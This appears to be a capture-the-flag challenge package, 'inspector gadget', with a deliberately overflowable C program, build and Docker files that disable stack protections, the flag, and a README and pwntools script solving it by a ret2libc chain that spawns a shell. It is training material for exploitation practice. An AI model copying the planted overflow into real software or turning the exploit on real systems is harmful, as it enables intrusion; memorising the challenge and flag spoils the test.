{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "flag.txt": "gigem{ret2libc_r0p_g04t3d}\n",
    "inspector_gadget.c": "#include <stdio.h>\n#include <unistd.h>\n\nvoid setup() {\n        // Ignore, stuff to set up server I/O correctly\n        setvbuf(stdin, NULL, _IONBF, 0);\n        setvbuf(stdout, NULL, _IONBF, 0);\n        setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nvoid pwnme() {\n        char buf[0x10];\n\n        puts(\"pwn me\");\n        read(0, buf, 0x60);\n\n        return;\n}\n\nint main(int argc, char* argv[]) {\n        setup();\n\n        puts(\"i've got 2 words for ya\");\n        pwnme();\n\n        puts(\"cool.\");\n}\n\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -fno-stack-protector -w -masm=intel -no-pie\nNAME := inspector_gadget\nPORT := 7005\nall: $(NAME)\n\nclean: .PHONY\n\tdocker container rm -f $(NAME)\n\tdocker rmi -f $(NAME)\n\trm -f $(NAME) $(NAME).zip libc.so.6 \n\nall:\n\t$(CC) $(CFLAGS) $(NAME).c -o $(NAME)\n\ndocker: Dockerfile \n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) $(NAME)\n\tdocker cp $(id):/lib/x86_64-linux-gnu/libc-2.28.so libc.so.6\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) libc.so.6 \n\n.PHONY:\n\n",
    "README.md": "# inspector gadget\n\nAuthor: `_mac_`\n\nInspector Gadget gave me this binary with one goal. pwn.\n\n## Dev Notes\nGiven `inspector_gadget` binary file and `libc.so.6`\nSet up remote with `make run`\nGet needed files with `make extract`\n\n## Solution\nThis is a classic ret2libc attack. The goal is to leak an address into libc to calculate its base address, then call `system()`. We can do this with 2 payloads. The first one uses `puts()` to leak the contents the GOT entry for `__libc_start_main` (this will have a live pointer into libc), then recurses on `pwnme()` to allow for a second go at the buffer overflow. For the second payload, we can use our leaked address to compute the base address of libc since ASLR adds a positive shift. Armed with the base address, we can call any function in libc, including `system()`. Conveniently, \"/bin/sh\" is in both the binary and libc. See `solve.py` for details.\n\nFlag: `gigem{ret2libc_r0p_g04t3d}`\n",
    "solve.py": "from pwn import *\n\ncontext.log_level = \"DEBUG\"\n\nelf = ELF(\"inspector_gadget\")\ncontext.binary = elf\nlibc = ELF(\"libc.so.6\")\n\np = remote(\"localhost\", 7005)\npadding = b\"A\" * 24\n\n# 0x000000000040128b : pop rdi ; ret\n# 0x00000000004011a3 : pop rsi ; ret\nret = 0x0000000000401016\npop_rdi = 0x40127b\npayload = padding + p64(pop_rdi) + p64(elf.got[\"__libc_start_main\"]) + p64(elf.plt[\"puts\"]) + p64(elf.sym[\"pwnme\"])\np.sendline(payload)\np.recvuntil(b\"pwn me\\n\")\nleak = int.from_bytes(p.recvline()[:-1], byteorder=\"little\")\nlibc.address = leak - libc.sym[\"__libc_start_main\"]\nprint(hex(libc.address))\nbinsh = next(libc.search(b\"/bin/sh\\0\"))\npayload2 = padding + p64(pop_rdi) + p64(binsh) + p64(libc.sym[\"system\"])\np.sendline(payload2)\np.interactive()\n",
    "category": "pwn"
}